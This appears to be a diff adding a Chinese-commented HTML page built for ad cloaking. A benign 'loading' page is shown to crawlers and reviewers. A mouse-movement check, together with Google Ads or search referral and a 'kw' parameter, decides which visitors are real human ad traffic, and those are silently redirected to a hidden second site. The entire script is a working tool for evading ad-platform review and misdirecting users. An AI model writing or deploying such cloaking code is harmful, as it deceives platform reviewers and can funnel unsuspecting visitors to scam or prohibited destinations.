@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>页面加载中...</title>
+    <style>
+        /* 基础样式重置 */
+        body, html {
+            margin: 0;
+            padding: 0;
+            width: 100%;
+            height: 100%;
+            overflow: hidden;
+            font-family: Arial, sans-serif;
+        }
+        /* A面（安全页）样式 */
+        #safe-page {
+            width: 100%;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            background-color: #f4f7f6;
+            color: #333;
+            text-align: center;
+        }
+        .safe-content {
+            padding: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- A面：安全页（默认显示） -->
+    <div id="safe-page">
+        <div class="safe-content">
+            <h2>欢迎访问</h2>
+            <p>页面正在加载，请稍候...</p>
+        </div>
+    </div>
+     
+    <!-- ================= 核心判定脚本 ================= -->
+    <script>
+    let hasTriggered = false;
+    let startX = null;
+    let startY = null;
+     
+    function handleMouseMove(event) {
+        if (hasTriggered) return;
+         
+        // 1. 记录初始坐标
+        if (startX === null || startY === null) {
+            startX = event.clientX;
+            startY = event.clientY;
+            return;
+        }
+         
+        // 2. 计算滑动距离，超过50像素判定为真实人类
+        let distance = Math.sqrt(Math.pow(event.clientX - startX, 2) + Math.pow(event.clientY - startY, 2));
+         
+        if (distance > 50) {
+            const urlParams = new URLSearchParams(window.location.search);
+            const kw = urlParams.get('kw');
+                
+            // 3. 来源校验
+            const referrer = document.referrer.toLowerCase();
+            const isFromGoogleAds = urlParams.has('gclid') || urlParams.has('gbraid');
+            const isFromGoogleSearch = referrer.includes('google.com') || referrer.includes('google.cn') || referrer.includes('google.com.hk');
+                
+            const isFromGoogle = isFromGoogleAds || isFromGoogleSearch;
+         
+            // 4. 终极审判：带 kw 参数 + 是谷歌来的
+            if (isFromGoogle && kw) {
+                hasTriggered = true;
+                document.removeEventListener('mousemove', handleMouseMove);
+                    
+                // 【优化核心】：直接让浏览器跳转到 B 面网址
+                // 如果需要把当前的参数（比如 kw、gclid 等）带过去，可以使用下面这行：
+                // window.location.replace("https://yifanyi.linkingin.top/" + window.location.search);
+                
+                // 如果只需要纯净地跳转到 B 面网址，用这行：
+                window.location.replace("https://yifanyi.linkingin.top/");
+                    
+            } else {
+                document.removeEventListener('mousemove', handleMouseMove);
+            }
+        }
+    }
+     
+    // 挂载监听
+    document.addEventListener('mousemove', handleMouseMove);
+    </script>
+
+</body>
+</html>
